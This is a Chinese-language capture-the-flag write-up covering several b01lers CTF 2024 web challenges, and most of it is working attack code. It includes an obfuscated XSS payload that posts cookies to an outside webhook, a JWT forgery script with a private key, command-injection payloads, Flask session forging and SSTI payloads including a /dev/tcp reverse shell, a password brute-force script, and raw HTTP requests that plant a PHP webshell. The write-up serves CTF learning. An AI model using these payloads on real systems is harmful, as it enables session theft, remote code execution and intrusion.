
# web
### b01ler-ad
post `/review`接口,会有一个浏览器来访问http://localhost:3000/admin/view?content?=${content}
,发送一个html文档,

过滤了' " \` 使用String.fromCharCode绕过
 应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>upload</title>
</head>
<body>
<script>
eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,97,50,48,99,57,102,57,100,45,98,53,48,54,45,52,97,56,97,45,57,51,100,97,45,99,101,53,52,102,100,56,55,100,48,54,97,39,44,123,109,101,116,104,111,100,58,39,80,79,83,84,39,44,109,111,100,101,58,39,110,111,45,99,111,114,115,39,44,98,111,100,121,58,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,41))</script>

</body>
</html>
```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)

### imagehost
flag在上传的png里,登录为admin即可
`FLAG_FILENAME="$(python3 -c 'import uuid;print(uuid.uuid4())').png"`

Route("/", home),   主页,jwt鉴权,给出当前用户所有上传的照片
Route("/login", login_get), 返回login.html,jinjia2渲染无ssti
Route("/login", login, methods=["POST"]),    传入用户名/密码,fetchone,设置jwt里userid和admin
Route("/register", register_get),             register.html
Route("/register", register, methods=["POST"]),   insert,参数化
Route("/logout", logout),                  
Route("/", upload, methods=["POST"]),        上传文件,
Route("/view/{filename}", view),   
```python
async def view(request):
	filename = request.path_params["filename"]
	
	path = UPLOAD_FOLDER.joinpath("a").with_name(filename)
	if not path.exists():
		return PlainTextResponse("Image not found", 404)
	
	return FileResponse(UPLOAD_FOLDER.joinpath("a").with_name(filename))
```

需要伪造admin用户,使用的是非对称加密,且公钥(decode)的文件位置可指定,能否通过upload上传公钥文件,,且pem还要符合png的标准

我为我的无知道歉,pem的格式是这样的
```pem
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCT96Ir3DM+PtlpHqyI8YOBOKyAexIO5RMpwUgUndIRBs72g0Ga
Tyy8yxKbMCaJ2nLQBC9D6cOp8UzHBeirsk0rYETGQBFqHzOvjod3VjE+9eRMJGl7
oohwHUzqHUOoNDKLvz2HuoVtRHawfw4EHCx9OTNyWct7jjg9VV0EEz9IdQIDAQAB
AoGAbFR3kZ70kVTYPYLslJIlUj0Y5jO0Y91Iq2BLknR9MGQIsCgmpn/i5BHU/HND
M9gQCMWXiSQjUU9Ng8SKtPGkVsl22mNZkRb69Ca1083pI2HxwL3dhEXl+VLD37w+
Cg+9glWnsjdUFy8WoiTun0yWJHiXKN2VRCv759+vJS6M150CQQDDQt2HoKEKVsU1
RLyRpr93Idtmzplro48zsvsmuCZJyNnpn4VYz7BFvu7SDX4Xkz1dr9gELnTvnQY3
rBWNQOXzAkEAwf6jpDFa+JL9/CLLTxuwn51Or8C4zcd1LjrmsqWz8SYDnuAZo4Vg
A2MlVAYpbk1XfVWzGPxralsa9+Zrl9yp9wJATmQe2h+T57m0TNF+vx7pyWNPWTPi
hkNQ75mQmRffT0oSqmd/uosPIsEn0i7Wi5JyVZWOLQeVrMkmwN0WffIrHwJBAIM2
4Sil2YpYokJwpmOTrxvHIvntuRI23yOt42zid5ucwsYrfiwEgrTH0u/KWyuoVI0J
8mHsGhuOE+epiwzkzHECQCN3G0+GcCfE6eYF5yW19n7QoK3sxU5HbwXKoAeXgM0z
TEiGjWVM5w+Ea21IUsE2O2CIG1CePqUI2DSujYCo7Oc=
-----END RSA PRIVATE KEY-----
```
或者说view路由读取公钥文件?

实践出真知!!!,只要不破坏pem文件格式也可以解析
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414025437.png)

类似于图片马的制作,在一个图片中间把公钥加上去
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414035316.png)


照着原来的代码写一个加密,注意在linux上跑...
```python
import jwt
from pathlib import Path


payload={"user_id":1,"admin":True}

def encode(payload, public_key: Path, private_key: Path):
        key = private_key.read_bytes()
        return jwt.encode(payload=payload, key=key, algorithm="RS256", headers={"kid": str(public_key)})
print(encode(payload=payload,public_key=Path('../../../../../../uploads/2b170008-668c-4810-9b38-3815912a675b.png'),private_key=Path('/tmp/private.pem')))
```

output`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL3VwbG9hZHMvMmIxNzAwMDgtNjY4Yy00ODEwLTliMzgtMzgxNTkxMmE2NzViLnBuZyJ9.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6dHJ1ZX0.fBuVTPsTuxKvVfpTUsi8qcDt07TqNZaORzH936DSgCT_xn5AtblipxDWKIHCbRRQyb1E2fwCQI7S9ORYNEb71PCrAHSop2akS084yIssIyVM3JGCVKpNrOvt-ta6Ua3TemAcpuI3Jx8jE_HTIot0rdBahS_DVXuZ8-NHn2YqIOo`

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414034815.png)



### 3-city-elves-writeups
命令注入,过滤了很多关键字

通过变量替换,先得到echo,使用base32 读取flag.png然后写入到静态文件style.css里
本地可以,远程不行
```json
{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;a=ch;e${a}o 'aaaa'>> as*${b}sty* ;'\""}
```

```json
//变量b为/,然后base32读取根目录flag.png
{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}proc${b}self${b}cmdline >> as*${b}sty* ;'\""}
```
sh不支持多级目录通配符...

```json
{"content":"1\"';e=se;b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}flag.png > as${e}ts${b}style ;'\""}
```

然后访问&下载/static/style 
`base32 -d style >flag.png`

![flag.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414174123.png)



`bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}`

### pwnhub
#ssti
可以上传笔记内容,存在ssti
```python
@app.get('/view/<id>')
@login_required
def view(id):
    if (users[current_user.name].verification != V.admin):
        return render_template_string('This feature is still in development, please come back later.')
    content = next((post for post in current_user.posts if id in post), None)
    if not content:
        return render_template_string('Post not found')
    content = content.get(id, '')
    if any(char in content for char in INVALID):
        return render_template_string(f'1{"".join("33" for _ in range(len(content)))}7 detected')
    return render_template_string(f"Post contents here: {content[:250]}")
```
但是需要先是admin
```python
users = {
    "admin": User("admin", ''.join(choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32)), V.admin),
    "pwnlyfans": User("pwnlyfans", ''.join(choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(32)), V.user)
}
```
看到secrets为`app.secret_key = hex(getrandbits(20))`,爆破

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414212946.png)

`0xbbe18`

`flask-unsign -s --secret "0xbbe18" --cookie "{'_fresh': False, '_id': '09120b7e8cf2ee71c6a5c874479193608d3eba9822f44d9341f44a6076456bd081bb8ad8719f74f2fb9deb2e7b8ac8c6b4b39cd30a83c082b852a0b96a4820ab', '_user_id': 'admin'}" --no-literal-eval`

得到admin的session
```
.eJwlzjEOwjAMQNG7ZGZwHDe2e5nKjh1RCRhaMSHuTiWmL_3pfco2jzzvZZ32OPNWtj3KWkArgnPKmJjJdXRbhjARa9XWQaKlmwriJAptVK9aB-60dA-Q6i4WwlUn08TpGumYfN0hozt50xENTNoAQZcFDVy7kSCYlwvyPvP4ayye-6t8f4VbMTY.ZhvbZQ.-GnCt5UVviTjN6PrEodMeBbKO3I
```

需要绕过ssti的长度限制
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414214310.png)

不需要绕,是先append然后根据len来显示错误消息,可以自己计算post_id
黑名单`INVALID = ["{{", "}}", ".", "_", "[", "]","\\", "x"]`

限制长度为255,

`{{cycler.__init__.__globals__.os.popen('id').read()}}`

`url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()`

ssti不下去了,

---
```bash
{%with a=request|attr("args")|attr("get")%}{%for y in(dict,)|map("attr",a("a"))|map("attr",a("b"))|first()()%}{%if "Pop"in(y,)|map("attr",a("c"))|first%}{%print(y("bash -c 'sh -i>& /dev/tcp/ATTACKR_IP_IN_DECIMAL/80 0>&1'",shell=1))%}{%endif%}{%endfor%}{%endwith%}
```

`?a=__base__&b=__subclasses__&c=__name__`



---
```bash
{%with a=session|first%}{%print(request|attr("application")|attr(a+"globals"+a))|attr(a+"getitem"+a)("json")|attr("codecs")|attr("sys")|attr("modules")|attr(a+"getitem"+a)("os")|attr("popen")("cat /*")|attr("read")()%}{%endwith%}
```


### b01lers_casino

```python
@app.route("/grab_flag", methods = ["GET"])
def grab_flag():
    jwt_token = request.cookies.get('jwt')
    if jwt_token == None or not is_valid_token(jwt_token, app.config['SECRET_KEY']):
        return jsonify({'error': 'Unauthorized'}), 403
    payload = decode_token(jwt_token, app.config["SECRET_KEY"])
    if (payload["username"] != "admin"):
        return jsonify({'error': 'Unauthorized'}), 403
    return jsonify({"flag": app.config["FLAG"]})
```

还是需要伪造为admin,得先知道admin的密码,
漏洞位置
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240415231107.png)
因为会根据密码排序,所以可以不断的修改密码来判断admin的密码

```python
import requests
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = 'https://127.0.0.1:5000'

session = requests.Session()


def login(username, password):
    url = f'{BASE_URL}/login'
    data = {'username': username, 'password': password}
    response = session.post(url, json=data, verify=False)
    return response.json()


def register(fullname, username, password):
    url = f'{BASE_URL}/register'
    data = {'fullname': fullname, 'username': username, 'password': password}
    response = session.post(url, json=data, verify=False)
    return response.json()


def scoreboard():
    url = f'{BASE_URL}/scoreboard'
    response = session.get(url, verify=False)
    return response.text


def slots(jwt_token, change):
    url = f'{BASE_URL}/slots'
    data = {'change': change}
    cookies = dict(jwt=jwt)
    response = session.post(url, json=data, cookies=cookies, verify=False)
    return response.text


def change_password(jwt_token, new_password):
    url = f'{BASE_URL}/update_password'
    data = {'new_password': new_password}
    print(data)
    cookies = dict(jwt=jwt)
    response = session.post(url, json=data, cookies=cookies, verify=False)
    return response.json()


def grab_flag(jwt_token):
    url = f'{BASE_URL}/grab_flag'
    cookies = dict(jwt=jwt)
    response = session.get(url, cookies=cookies, verify=False)
    return response.json()


name = "OUXS"
register("Captain Baccarat", name, "0"*64)
jwt = login(name, "0"*64)["jwt"]
slots(jwt,1000000-500)

pwd = ""
chars = "0123456789abcdef"
for i in range(64):
    for c in chars:
        pwd = pwd[:i] + c + "0"*(64-i-1)
        print(pwd)
        change_password(jwt, pwd)
        scb = scoreboard()

        soup = BeautifulSoup(scb, 'html.parser')
        td_tags = soup.find_all('td')
        td_contents = [td.get_text() for td in td_tags]
        print(td_contents)
        if td_contents[0] == "Captain Baccarat":
            pwd = pwd[:i] + chars[chars.index(c)-1]
            print(pwd)
            break
jwt = login("admin", pwd)["jwt"]

print(grab_flag(jwt))
```

### library_of_\<?php

一处文件包含,会包含session的键值对
```php
        if (hash('sha256', $d + rand(0, getrandmax())) === $securify) {
            include getBookPath($_GET['s']);
        }
```
使用大数绕过
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416003244.png)

```php
        echo substr($results, 0, $t) . '<b>' . htmlspecialchars($this->search, ENT_QUOTES, 'UTF-8') . '</b>' . substr($results, $t);
```
index.php会post一个参数q,然后将q的内容html实体编码并左右添加随机生成的字符串,
,也就是我们输入的内容会写入一个文件,且我们可以文件包含

还需要解决一个问题,那就是写入的字符串不能有<,该怎么让php解析
我们发现当username为空,会从session的后六位取,当键名不合法会输出报错信息
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416005508.png)
利用这个可以写入webshell,通过/* 注释

\<?php/* 太长,只截取6位
\<?=%0A/* 会报错
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416010415.png)

不知道为什么只有\<?1可以


---
```http
POST /index.php HTTP/1.1
Host: libraryofphp-e021c5272a541b25.instancer.b01lersc.tf
Content-Length: 27
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=a%00aaaaaaaaaaaaaa<?1/*; username=
Connection: close

q=*/; echo `cat /*`; //aaax
```



```http
GET /search.php/?s=0v-0000h-08481&securify=870067877a36e908674b7ca41d36ffcc9ed8636f13acbf51f3b195f4e06380ad&d=-103210321111111111110321032111111111111032103211111111111 HTTP/1.1
Host: libraryofphp-e021c5272a541b25.instancer.b01lersc.tf
Cookie: username=; PHPSESSID=a%00aaaaaaaaaaaaaa<?1/*
Connection: close
```




# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-13   22:21